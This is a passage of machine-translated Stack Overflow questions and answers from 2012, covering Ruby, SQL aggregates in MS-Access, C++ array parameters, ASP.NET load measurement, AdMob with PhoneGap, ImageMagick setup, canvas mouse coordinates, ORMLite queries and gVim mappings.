        $model->prop1 = $this->input->post('prop1');
        // try to save it
        if ($model->save()) {
            // save successful
            redirect(...);
        } else {
            // save failed load form again, with the model
            $this->load->view('path/to/the/form', array('model' => $model));
        }
    }
} 
```

该视图可以像这样工作：

```
 <form method="post" action="...">

     <label>prop0</label>
     <input type="text" name="prop0" value="<?php print $model->prop0?> ">
     <?php if (!empty($model->error->prop0)):?> 
         <div class="error"><?php print $model->error->prop1; ?></div>
     <?php endif; ?>

     <label>prop1</label>
     <input type="text" name="prop1" value="<?php print $model->prop1?> ">
     <?php if (!empty($model->error->prop0)):?> 
         <div class="error"><?php print $model->error->prop1; ?></div>
     <?php endif; ?>

     <buton type="submit">go</button>
 </form> 
```

当数据库中不存在以前的模型时，可以使用相同的表单，只需创建一个您需要的模型的空实例，并将其传递给表单。

# ruby - 使用 ruby 从数组中查找包含项目的哈希

> ID：11866273
> 
> 赞同：0
> 
> 时间：2012-08-08T14:07:04.640
> 
> 标签：ruby, arrays, hash

很抱歉因为我的错而误会我没有检查项目的类别......

我有一个数组：

```
数组 = [链接 1、链接 2、链接 3、链接 4 等]
```

和 array_of_hashes 有两个项目：名称和链接

```
哈希 = [ :names, :links ] 例如
array_of_hashes = [{ :names => name1, :links => link1}, {:names = name2, :links => link2}, ... ]
```

我想对 array_of_hashes 中的每对项目做一些事情，其中​​包括来自数组的链接。

UPD：修改后的数据...抱歉误解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:49:28.077

枚举哈希数组并搜索链接数组。

```
array = [:link1, :link2, :link3]
array_of_hashes = [{ :names => :name1, :links => :no_link}, {:names => :name2, :links => :link2}]

array_of_hashes.each do |hash|
  if array.any? {|s| s==hash[:links]}
    puts "Do something with #{hash[:names].to_s}"
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T17:46:28.483

这是一个有点模糊的问题，但这里是一个镜头。

您将需要重新排序您尝试从哈希访问的内容，除非 :name 是必需的。

```
arr = ["link0", "link1",..."linkN"]
hsh = { "link0", item0, "link1", item1, "link1", item2,..."linkN", itemN}
hsh.each_pair | link, item |
  do_something_foo(item) if arr.include?(link) # do_something_foo is a predefined function
end 
```

> jagga99 写道
> 
> 我想对包含数组链接的哈希中的每个项目做一些事情。非常感谢你的帮助。

如果 [:name, :link] 是 require 对，那么您需要确定哪个部分是要处理的项目：名称或链接。

# sql - 表达式中不能有聚合函数

> ID：11866278
> 
> 赞同：1
> 
> 时间：2012-08-08T14:07:16.223
> 
> 标签：sql, ms-access

嗨，我正在尝试执行下面的 qry，并且在 subqry sum 行上不断收到“不能在表达式中具有聚合函数”错误。有什么办法可以使这项工作？

```
SELECT ID, 
    DateColumn, 
    Contamination, 
    BrokenGlass, 
    OtherReasons, 
    SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons) AS Total, 
    SUM(Contamination) / Total AS Expr1,
    (SELECT SUM(Contamination)/ SUM(SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons))
     FROM tbltest T2
     WHERE T2.ID <= T2.ID) AS RunningSum
FROM tbltest
GROUP BY ID, DateColumn, Contamination, BrokenGlass, OtherReasons 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:12:35.123

我猜您正在使用基于 Expr1 的 MS-Access，请尝试以下操作。替换`Total`查询中的别名用法，您不能`SUM(SUM())`：

```
SELECT ID, 
    DateColumn, 
    Contamination, 
    BrokenGlass, 
    OtherReasons, 
    SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons) AS Total, 
    SUM(Contamination) / (SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons)) AS Expr1,
    (SELECT SUM(Contamination)/ (SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons))
     FROM tbltest T2
     WHERE T2.ID <= tbltest.ID) AS RunningSum  -- I think you want T2.ID <= tbltest.ID not T2.ID <= T2.ID
FROM tbltest
GROUP BY ID, DateColumn, Contamination, BrokenGlass, OtherReasons 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:12:50.087

将您更改`sum(sum())`为仅使用加法运算符来计算结果总和：

```
--SUM(SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons)) 
(SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons)) 
```

此外，不要尝试在同一`select`子句中引用别名。要么使用子查询/派生表，要么只对“总计”重复所需的计算。

```
--SUM(Contamination) / Total AS Expr1
SUM(Contamination) / (SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:13:20.820

```
SELECT ID,  
    DateColumn,  
    Contamination,  
    BrokenGlass,  
    OtherReasons,  
    SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons) AS Total,  
    SUM(Contamination) / Total AS Expr1, 

    /* CHANGED THIS LINE */
    (SELECT SUM(Contamination)/ (SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons))
     FROM tbltest T2 
     WHERE T2.ID <= T2.ID) AS RunningSum 

FROM tbltest 
GROUP BY ID, DateColumn, Contamination, BrokenGlass, OtherReasons 
```

# 已编辑

结果不正确是一个与最初提出的问题完全不同的问题，我将不得不在黑暗中尝试一下，因为我对你的项目一无所知，但你去吧，也许它可以让你开始正确的方向。

```
SELECT ID,
    DateColumn,
    Contamination,
    BrokenGlass,
    OtherReasons,
    SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons) AS Total,
    SUM(Contamination) / Total AS Expr1,
    (
         SELECT SUM(Contamination)/ (SUM(Contamination) + SUM(BrokenGlass) + SUM(OtherReasons))
         FROM tbltest T2 
         WHERE T2.ID <= tbltest.ID
    ) AS RunningSum
FROM tbltest
GROUP BY ID, DateColumn, Contamination, BrokenGlass, OtherReasons 
```

# c++ - 函数参数：指向对象数组的指针

> ID：11866284
> 
> 赞同：5
> 
> 时间：2012-08-08T14:07:32.657
> 
> 标签：c++, arrays, pointers, parameters

在我的主要功能中，我创建了某个类“菜单”的对象数组

当我调用一个函数时，我想提供一个指向该数组的指针。

```
Menu menu[2];
// Create menu [0], [1]
Function(POINTER_TO_ARRAY); 
```

问题：编写函数参数的正确方法是什么？

我尝试：

```
Function(&menu); 
```

并在头文件中：

```
void Function(Menu *menu[]); // not working
error: Cannot convert parameter 1 from Menu(*)[2] to Menu *[]

void Function(Menu * menu); // not working
error: Cannot convert parameter 1 from Menu(*)[2] to Menu *[] 
```

而且我想不出任何其他方法来做到这一点，也找不到解决这个特定问题的方法。

简单地说，我希望能够通过指针访问函数内的 Menu 数组。指向数组指针的普通指针有什么区别？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-08T14:09:38.573

宣言：

```
void Function(Menu* a_menus); // Arrays decay to pointers. 
```

调用：

```
Function(menu); 
```

但是，您需要告知`Function()`数组中有多少条目。因为这是 C++，所以建议使用[`std::array`](http://en.cppreference.com/w/cpp/container/array)或者[`std::vector`](http://en.cppreference.com/w/cpp/container/vector)知道它们的大小、开始和结束：

```
std::vector<Menu> menus;
menus.push_back(Menu("1"));
menus.push_back(Menu("2"));

Function(menus);

void Function(const std::vector<Menu>& a_menus)
{
    std::for_each(a_menus.begin(),
                  a_menus.end(),
                  [](const Menu& a_menu)
                  {
                      // Use a_menu
                  });
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T14:09:54.300

通过 const 或非常量指针

```
void Function(Menu const* menu);
void Function(Menu* menu); 
```

...或通过 const 或非 const 引用

```
void Function(Menu const (&menu)[2]);
void Function(Menu (&menu)[2]); 
```

可以将其推广到模板，以便编译器推断出数组大小：

```
template<size_t N> void Function(Menu const (&menu)[N]);
template<size_t N> void Function(Menu (&menu)[N]); 
```

始终调用为`Function(menu);`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-08T14:11:18.777

如果你使用应该工作

```
 void Function(Menu * menu); 
```

并使用

```
Function(menu); 
```

代替

```
Function(&menu); 
```

传递数组名称会导致它衰减为指向数组中包含的类型的指针。但是，正如@hmjd 在他的回答中所说，您还需要传递数组大小，因此如果此选项对您开放，他对使用向量的建议是有利的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:18:03.923

您可以使用

```
Function((void *) whatever_pointer_type_or_array_of_classes); 
```

在你的主要。

在函数中：

```
type Function(void * whatever)
{
    your_type * x =(your_type *) whatever;
    //use x 
    ....
    x->file_open=true;
    ....
} 
```

# asp.net - 用于获取并发用户数（用户负载）和总带宽使用量的 Asp.net 性能计数器？

> ID：11866286
> 
> 赞同：0
> 
> 时间：2012-08-08T14:07:33.163
> 
> 标签：asp.net, .net, windows-server-2008, asp.net-4.0, performancecounter

我在 Windows 2008 R2 服务器上使用 ASP.NET 4.0。

我想测量两件事：

1.  现有硬件是否足以满足不断增长的用户负载。

2.  我需要升级多少硬件（就 RAM 和处理器而言），以便网站正常工作。

**我已经在监视“会话活动”、“可用 MBytes”、“% 处理器时间”、“请求/秒”、“排队请求”。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:13:54.313

仅凭性能计数器无法回答您的两个问题。您需要考虑“在指定负载下的合理响应时间是多少？” ¹

如果您希望每个请求都在 0.1 秒内完成，那么您将需要更多的硬件才能在 2 秒内完成所有请求。

最好的方法是负载测试（更高的 Visual Studio 版本包括用于此的工具）查看负载（性能计数器）*和*完成请求的时间。

记得包括：

*   数据库响应能力（可能是 Web 服务器很容易处理线索，但所有延迟都在等待数据库操作）。
*   同一个 Web 服务器是否也提供静态内容：从单独的服务器提供这些内容会有所帮助吗？

* * *

¹显然更多的请求会降低性能，但是通过指定您可以进行可重复的测试，这对于确定更改是否提高了性能（或没有）至关重要。

# python - 在 Mac 上的 Python 2.7.3 中导入 .pyd（使用 SWIG 创建）

> ID：11866288
> 
> 赞同：3
> 
> 时间：2012-08-08T14:07:36.733
> 
> 标签：python, macos, import, swig

我在名为 (_example.pyd) 的 Windows 下使用 SWIG 创建了一个 .pyd 文件。

我可以使用相同版本的 Python（Python 2.7.3）通过以下简单命令将文件发送到我的电子邮件并使用另一台 Windows 机器导入：

```
.>>> import _example

.>>> 
```

但是当我将它发送到我的电子邮件并尝试使用 Mac 导入文件时，我得到：

```
"No module named _example" 
```

有任何想法吗？

在这两种情况下，我都将文件保存到 Python 路径中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:37:52.773

这是因为 Python 扩展（.pyd 文件）本质上是 DLL。
如果你想在 Mac 上使用你的扩展，你需要在 Mac 上编译它。

[http://docs.python.org/faq/windows.html#is-a-pyd-file-the-same-as-a-dll](http://docs.python.org/faq/windows.html#is-a-pyd-file-the-same-as-a-dll)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-23T23:51:03.610

我曾经因为不同的原因遇到同样的错误：我从源代码构建了模块，除了我假设**“.pyd”**是一个通用扩展名（无论是 DLL 还是 ELF 共享对象），所以我告诉 gcc 创建“ mymodule.pyd”而不是“mymodule.so”：在 Linux 和 Windows 上，文件的内容在编译后是正确的，但名称仅在 Windows 上有效。

在Linux上，一个简单的`mv mymodule.pyd mymodule.so`解决了它。

# c++ - 可以使用尾随返回类型进行条件重载吗？

> ID：11866291
> 
> 赞同：1
> 
> 时间：2012-08-08T14:07:49.717
> 
> 标签：c++, templates, c++11, sfinae, trailing-return-type

假设您尝试执行以下操作：

```
template</* args */>
typename std::enable_if< /*conditional*/ , /*type*/ >::type
static auto hope( /*args*/) -> decltype( /*return expr*/ )
{
} 
```

是否可以将条件包含/重载（`std::enable_if`）与尾随返回类型（`auto ... -> decltype()`）结合起来？

我不会对使用预处理器的解决方案感兴趣。我总是可以做类似的事情

```
#define RET(t) --> decltype(t) { return t; } 
```

并将其扩展为也采用整个条件。相反，我感兴趣的是语言是否支持它而不使用返回类型的另一个特征，即`ReturnType<A,B>::type_t`或函数体中使用的任何特征。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-08T14:25:44.153

*trailing-return-type*与普通返回类型没有太大区别，只是它是在参数列表和 cv-/ref-qualifiers 之后指定的。此外，它不一定需要`decltype`，普通类型也可以：

```
auto answer() -> int{ return 42; } 
```

所以现在你应该看到你的问题的答案是什么：

```
template<class T>
using Apply = typename T::type; // I don't like to spell this out

template</* args */>
static auto hope( /*args*/)
    -> Apply<std::enable_if</* condition */, decltype( /*return expr*/ )>>
{
} 
```

虽然我个人更喜欢使用 just `decltype`and 表达式 SFINAE，但只要条件可以表示为表达式（例如，您可以在特定类型的对象上调用函数）：

```
template<class T>
static auto hope(T const& arg)
  -> decltype(arg.foo(), void())
{
  // ...
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T15:03:16.163

我只能假设您的原始伪代码是一个函数模板，否则 SFINAE 将无法完全工作。现在，如果它是一个模板函数，您可以使用一个默认的额外模板参数并在该参数上使用 SFINAE：

```
template <typename T, typename _ = typename std::enable_if< trait<T>::value >::type >
static auto function( T arg ) -> decltype( expression ) {
   // ...
} 
```

我更喜欢这个，因为它将 SFINAE 的使用限制在`template`子句中并留下更清晰的函数签名。这是我最喜欢*的*C++11 新特性之一。

# android - Android AdMob Phonegap 不工作

> ID：11866294
> 
> 赞同：1
> 
> 时间：2012-08-08T14:08:03.283
> 
> 标签：android, android-layout, cordova, admob

谁能帮助我，从过去两天开始，我一直在尝试在 android 中实现 admob，但是收到以下错误消息-

> 08-08 19:05:33.362: W/webcore(3228): 在第一个布局后无法获取 viewWidth 08-08 19:10:51.632: W/dalvikvm(3328): VFY: 无法解析直接方法 3204 ：Landroid/webkit/WebView；。(Landroid/content/Context;Landroid/util/AttributeSet;IZ)V 08-08 19:10:51.662: I/webclipboard(3328):clipservice: android.sec.clipboard.ClipboardExManager@40534500 08-08 19:10: 52.142：I/CordovaLog(3328)：将日志级别更改为 DEBUG(3) 08-08 19:10:52.142：I/CordovaLog(3328)：找到 useBrowserHistory=false 的首选项 08-08 19:10:52.142：D/ CordovaLog(3328)：找到 useBrowserHistory=false 的首选项 08-08 19:10:52.152：E/dalvikvm(3328)：找不到类 'android.webkit.WebResourceResponse'，引用自方法 org.apache.cordova.CordovaWebViewClient。 generateWebResourceResponse 08-08 19:10:52.152: W/dalvikvm(3328): VFY：无法解析 Lorg/apache/cordova/CordovaWebViewClient 中的新实例 467 (Landroid/webkit/WebResourceResponse;)；08-08 19:10:52.152: W/dalvikvm(3328): VFY: 无法找到签名中引用的类 (Landroid/webkit/WebResourceResponse;) 08-08 19:10:52.182: W/dalvikvm(3328): VFY : 找不到签名中引用的类 (Landroid/webkit/WebResourceResponse;) 08-08 19:10:52.182: W/dalvikvm(3328): VFY: 找不到签名中引用的类 (Landroid/webkit/WebResourceResponse;) 08 -08 19:10:52.182: W/dalvikvm(3328): VFY: 无法解析虚拟方法 3225: Landroid/webkit/WebViewClient;.shouldInterceptRequest (Landroid/webkit/WebView;Ljava/lang/String;)Landroid/webkit/ Web资源响应；08-08 19:10:52.182: D/DroidGap(3328): DroidGap.init() 08-08 19:10:52.192: D/CordovaWebView(3328): >>> loadUrl(file:///android_asset/www/index.html) 08-08 19:10:52.192: D/PluginManager(3328): init() 08-08 19:10:52.212: D/CordovaWebView(3328): >>> loadUrlNow() 08-08 19:10:52.272: E/Ads(3328): 找不到 com.google.ads.AdActivity，请确保它已在 AndroidManifest.xml 中注册。08-08 19:10:52.272：E/Ads(3328)：您必须在 AndroidManifest.xml 中使用 configChanges 声明 AdActivity。08-08 19:10:52.282:I/webclipboard(3328):clipservice:android.sec.clipboard.ClipboardExManager@405512e0 08-08 19:10:52.332:I/webclipboard(3328):clipservice:android.sec.clipboard .ClipboardExManager@405512e0 08-08 19:10:52.902: D/AndroidRuntime(3328): 关闭 VM 08-08 19:10:52.902: W/dalvikvm(3328): threadid=1: 线程以未捕获的异常退出（组= 0x40018578) 08-08 19:10:52.902: E/AndroidRuntime(3328):

```
Following is the code of my main java file -

    import org.apache.cordova.*;
    import com.google.ads.*;
    import android.os.Bundle;
    import android.app.Activity;
    import android.view.Menu;
    import android.view.MenuItem;
    import android.support.v4.app.NavUtils;
    import android.widget.*;

    public class Albania extends DroidGap {
        private AdView adView;

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            super.loadUrl("file:///android_asset/www/index.html");
            super.setIntegerProperty("loadUrlTimeoutValue", 70000);
            adView = new AdView(this, AdSize.BANNER, "a1502224a0ab1f8");
            LinearLayout layout = (LinearLayout) findViewById(R.id.adView);
            layout.addView(adView);
            adView.loadAd(new AdRequest()); } 
```

这是我的 activity_appname.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
    android:orientation="vertical"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true"
        android:padding="@dimen/padding_medium"
        android:text="@string/hello_world"
        tools:context=".Albania" />

    <com.google.ads.AdView android:id="@+id/adView"
                         android:layout_width="wrap_content"
                         android:layout_height="wrap_content"
                         ads:adSize="BANNER"
                         ads:testDevices="TEST_EMULATOR, S567041ba118d"
                         ads:loadAdOnCreate="true"/>

</RelativeLayout> 
```

这是我的 android manifest.xml 文件

```
 <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name=".Albania"
            android:label="@string/title_activity_albania" 
            android:configChanges="orientation|keyboardHidden|orientation|keyboard|screenSize|uiMode|screenLayout|locale"
            android:hardwareAccelerated="true" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity> 
    <activity
        android:name="com.google.ads.AdActivity"
 android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize" />         
    </application>
</manifest> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T21:11:07.970

您无需`AdView`在 XML 和代码中指定。只需放入`ads:adUnitId="a1502224a0ab1f8"`您`com.google.ads.AdView`的 XML 中，您就可以删除以下 Adview 代码：

```
adView = new AdView(this, AdSize.BANNER, "a1502224a0ab1f8");
LinearLayout layout = (LinearLayout) findViewById(R.id.adView);
layout.addView(adView);
adView.loadAd(new AdRequest()); 
```

编辑：

Cordova 让您加载一个 url 并抽象您设置视图的方式。您必须手动获取 Cordova WebView 的父级，并将 AdView 添加到 parentView。代码可能如下所示：

```
adView = new AdView(this, AdSize.BANNER, "a1502224a0ab1f8");
// Get the parent of the cordova webview. May be able to do something like: this.webView.getParent();
parentView.addView(adView);
adView.loadAd(new AdRequest()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:16:05.200

从[这个 SO question](https://stackoverflow.com/questions/10672334/could-not-find-com-google-ads-adactivity-must-have-adactivity-declared-in-the-ma)中，确保您的清单 xml 中有：

```
<uses-sdk android:minSdkVersion="8" android:targetSdkVersion="15"/> 
```

# ruby-on-rails - Rails ImageMagic 和 rmagic

> ID：11866296
> 
> 赞同：0
> 
> 时间：2012-08-08T14:08:14.363
> 
> 标签：ruby-on-rails, ruby, linux

我正在关注 ryan 的教程[http://railscasts.com/episodes/253-carrierwave-file-uploads?view=comments](http://railscasts.com/episodes/253-carrierwave-file-uploads?view=comments)，但他说我们必须安装 imagemagic。所以我做了什么来安装它

```
gem "carrierwave"
gem "mini_magick"
gem "rmagick" 
```

在宝石文件中。但是当我捆绑时这仍然失败。安装它的最佳方法是什么。我正在使用 linux ubuntu 并且对它相当陌生。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:17:34.640

您需要在 ubuntu 上安装 imagemagick，然后安装`rmagick`gem。

```
sudo apt-get install imagemagick libmagickcore-dev libmagickwand-dev 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:17:57.963

在 Linux 上运行 -

```
sudo apt-get install imagemagick libmagickcore-dev libmagickwand-dev
sudo gem install rmagick 
```

# javascript - 在 Firefox 中获取鼠标在画布上的位置

> ID：11866298
> 
> 赞同：1
> 
> 时间：2012-08-08T14:08:27.173
> 
> 标签：javascript, html, firefox, html5-canvas

我想获得相对于画布的 X、Y 坐标（在鼠标移动事件中）。

我正在使用这个：

```
<canvas id='c' onmousemove="xy(event)" WIDTH=500 HEIGHT=300> 
```

js：

```
function xy(e)
{
    x = e.offsetX||e.layerX;
    y = e.offsetY||e.layerY;
} 
```

这在 Chrome 中运行良好，但在 Firefox 中则不行。如果画布元素位于 0,0 位置，它也适用于 Firefox。

看看这个：http: [//jsbin.com/ozowaz/10](http://jsbin.com/ozowaz/10)

我该怎么做才能让它在 FF 中也能正常工作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:43:13.787

容器必须有

```
position: relative; 
```

风格。不要使用该容器来设置边框样式，因为这意味着坐标中的 +n px（n= 边框大小）！

感谢： [http ://dev.opera.com/articles/view/html5-canvas-painting/](http://dev.opera.com/articles/view/html5-canvas-painting/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:11:59.740

您可以尝试计算它：

```
// ...
var x = e.pageX - canvas.offsetTop; 
```

其中canvas 是canvas dom 元素。这应该适用于FF。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-16T12:05:08.953

这对我有用（纯js）

```
function getX(event, canvas){
     if(event.offsetX){
       return event.offsetX;
     }
     if(event.clientX){
     return event.clientX - canvas.offsetLeft;
     }
    return null;
 }

function getY(event, canvas){
    if(event.offsetY){//chrome and IE
        return event.offsetY;
    }
    if(event.clientY){// FF
        return event.clientY- canvas.offsetTop;
    }
    return null;    
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-06-04T07:47:32.550

@2astalavista 由于声誉，我无法发表评论，所以我会把它放在这里，尽管我不应该这样做：

我尝试了接受的答案，但它只解决了位于画布左侧/上方的其他元素的问题。对我来说，它没有考虑画布的边距。我不知道我是否做得对。我也不喜欢 Html 侧面解决方案的想法。有人更改了 Html，忘记了“位置：相对；” 导致几乎无法追踪的错误。

我使用了 Nech 的解决方案，但注意到当我将元素放置在画布左侧或上方时它无法正常工作。它只考虑画布边距之类的东西。

我使用了以下代码，与 Chrome 部分相比，Firefox 部分的准确率仍然只有大约 95 - 99%。但它完成了工作：

```
function getEventX(event){
    if (event.offsetX) {
        return event.offsetX;
    }
    if (event.clientX) {
        var currentElement = event.currentTarget;
        var offsetLeft = currentElement.offsetLeft;

        while(currentElement.parentElement && currentElement.parentElement.offsetLeft){
            currentElement = currentElement.parentElement;
            offsetLeft += currentElement.offsetLeft;
        }     

        return event.clientX - offsetLeft;
    }
    return null;
};

function getEventY(event){
    if (event.offsetY) {
        return event.offsetY;
    }
    if (event.clientY) {
        var currentElement = event.currentTarget;
        var offsetTop = currentElement.offsetTop;

        while(currentElement.parentElement && currentElement.parentElement.offsetTop){
            currentElement = currentElement.parentElement;
            offsetTop += currentElement.offsetTop;
        }     

        return event.clientY - offsetTop;  
    }
    return null;
}; 
```

我还删除了传递给函数的画布，您可以通过以下方式获取画布：

```
event.currentTarget; 
```

处理多个画布时可能会更好。

# android - ORMLite 使用谓词选择一些列

> ID：11866304
> 
> 赞同：1
> 
> 时间：2012-08-08T14:08:50.237
> 
> 标签：android, select, where, ormlite

我有一些字段的 ORMLite 数据库。我想从我从 web 服务获得的 id == id 的表中选择标题。我喜欢这样：

```
 try {
    Dao<ProcessStatus,Integer> dao = db.getStatusDao(); 
    Log.i("status",dao.queryForAll().toString());
    QueryBuilder<ProcessStatus,Integer> query = dao.queryBuilder();
    Where where = query.where();
    String a = null;
    for(Order r:LoginActivity.orders) {
        //LoginActivity.orders - array of my objects which I get from webservice
        Log.i("database",query.selectRaw("select title from process_status").
            where().rawComparison(ProcessStatus.STATUS_ID, "=",
                       r.getProcess_status().getProccessStatusId()).toString());
    }
    Log.i("sr",a);
} catch (SQLException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} 
```

我试过这样，但我只得到我的身份证，而不是标题。我试过这样：

```
Log.i("database", query.selectColumns(ProcessStatus.STATUS_TITLE).where().
    eq(ProcessStatus.STATUS_ID, r.getProcess_status().getProccessStatusId())
    .toString()); 
```

但我有同样的结果。我应该如何从数据库中获取数据？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-08T15:21:57.743

要从表中选择特定字段，您可以执行以下操作：

```
String result = "";
try {
    GenericRawResults<String[]> rawResults = yourDAO.queryRaw("select " +
        ProcessStatus.STATUS_TITLE +" from YourTable where "+ 
        ProcessStatus.STATUS_ID + " = " + 
        r.getProcess_status().getProccessStatusId());
    List<String[]> results = rawResults.getResults();
    // This will select the first result (the first and maybe only row returned)
    String[] resultArray = results.get(0);
    //This will select the first field in the result which should be the ID
    result = resultArray[0];
} catch (Exception e) {
    e.printStackTrace();
} 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-08T16:17:07.433

如果不查看该领域的所有类别和其他类别，很难正确回答这个问题`processStatusId`。但是，我认为您正在做太多原始方法，并且可能无法正确逃避您的价值观等。

我建议您使用`IN`SQL 语句而不是在循环中执行的操作。就像是：

```
List<String> ids = new ArrayList<String>();
for(Order r : LoginActivity.orders) {
    ids.add(r.getProcess_status().getProccessStatusId());
}
QueryBuilder<ProcessStatus, Integer> qb = dao.queryBuilder();
Where where = qb.where();
where.in(ProcessStatus.STATUS_ID, ids);
qb.selectColumns(ProcessStatus.STATUS_TITLE); 
```

现在您已经构建了查询，您可以检索您的`ProcessStatus`对象，也可以使用以下方法获取标题`dao.queryForRaw(...)`：

```
List<ProcessStatus> results = qb.query();
// or use the prepareStatementString method to get raw results
GenericRawResults<String[]> results = dao.queryRaw(qb.prepareStatementString());
// each raw result would have a String[] with 1 element for the title 
```

# javascript - 仅在某些客户端上的无效 Web 服务调用

> ID：11866311
> 
> 赞同：0
> 
> 时间：2012-08-08T14:09:13.427
> 
> 标签：javascript, ajax, webmethod

我的网站使用 ajax 和 .Net webmethods。

在本地和 99% 的客户上一切正常。但是有一些客户端不断收到此错误：“无效的 Web 服务调用，参数缺失值：\u0027elementid\u0027”。

该错误似乎在早上更频繁，并且所有收到此错误的客户都在同一栋楼中。我尝试了许多不同的解决方案，但它们通常适用于对 web 方法的调用根本不起作用的情况。我认为问题可能出在所述建筑物的网络中。

Javascript：

```
 function queryDbForMeldingen() {
        //Get items from db and use the result to fill the page
        SendAjax("FindMeldingen", formatMeldingConstraints(), formatMeldingTabel);
    }

    function formatMeldingConstraints() {
        /*code omitted for clarity*/
        var constraints = {
            itemsonpage: parseInt(aantalItems),
            pagenr: parseInt(currentPage),
            orderby: orderby,
            orderdirection: orderdirection,
            elementid: $('#<%= ddlElementen.ClientID %>_ddlElementen').val(),
            filiaalid: $('#<%= ddlFiliaal.ClientID %>_ddlVestiging').val(),
            statusid: $('#<%= ddlStatus.ClientID %>_ddlEnum').val(),
            prioriteitid: $('#<%= ddlPrioriteit.ClientID %>_ddlPrioriteiten').val(),
            uitvoerderid: $('#<%= ddlUitvoerder.ClientID %>_ddlLeveranciers').val(),
            extraid: $('#<%= ddlExtra.ClientID %>_ddlEnum').val(),
            toonid: $('#<%= ddlMeldingToon.ClientID %>_ddlEnum').val(),
            datefrom: $('#<%= tb_date_from.ClientID %>').val(),
            dateto: $('#<%= tb_date_to.ClientID %>').val(),
            trefwoord: $('#<%= tb_keyword.ClientID %>').val()
        };

        return JSON.stringify(constraints);
    } 
```

C＃：

```
[WebMethod]
public List<Melding> FindMeldingen(int itemsonpage, int pagenr, string orderby, string orderdirection,
    int elementid, int filiaalid, int statusid, int prioriteitid, int uitvoerderid, int extraid,
    int toonid, string datefrom, string dateto, string trefwoord) 
```

我可能很傻，错过了一些非常简单的东西。

提前致谢，

枯萎病

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:25:26.907

似乎 $('#<%= ddlElementen.ClientID %>_ddlElementen').val() 没有返回您期望的值。你为什么不尝试给它一个默认值？$('#<%= ddlElementen.ClientID %>_ddlElementen').val() || '缺少元素'

然后你会看到你是否在服务器请求中找到了 elementid 默认值。

是否所有其他值都发送到服务器？

# vim - Windows 上的 gVim：从 _vimrc 读取时 imap 不映射 ç (cedilla)

> ID：11866313
> 
> 赞同：0
> 
> 时间：2012-08-08T14:09:14.880
> 
> 标签：vim

这里有一个奇怪的问题：我试图避免`Esc`退出插入模式的键。我偶然发现了这篇文章：http: [//vim.wikia.com/wiki/Avoid_the_escape_key](http://vim.wikia.com/wiki/Avoid_the_escape_key)，我喜欢以下解决方案：

```
" Two letters.
:imap çç <Esc> 
```

在 gVim 中我输入：

```
:imap çç <Esc> 
```

我*确实*工作。但是当我尝试通过将其放入我的 _vimrc 文件中使其成为默认值时：

```
imap çç <ESC> 
```

我不工作。它没有给我任何错误，但不起作用。其他所有字母都有效，但似乎特别是这封信`ç`没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:44:15.203

你可以写：

```
au VimEnter * imap çç <ESC> 
```

在你的 .vimrc 中。`au`是短的`autocmd`，用来告诉vim你想把这个作为分号命令执行。`VimEnter`告诉 vim 在启动时执行它。语法是：

```
autocmd events pattern command 
```

您还可以看到帮助`autocmd`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T16:12:28.490

尝试使用以下内容：

1.  添加

    ```
    scriptencoding utf-8
    set encoding=utf-8 
    ```

    在你的 vimrc 的最开始。

2.  确保 vimrc 以 UTF-8 格式保存。

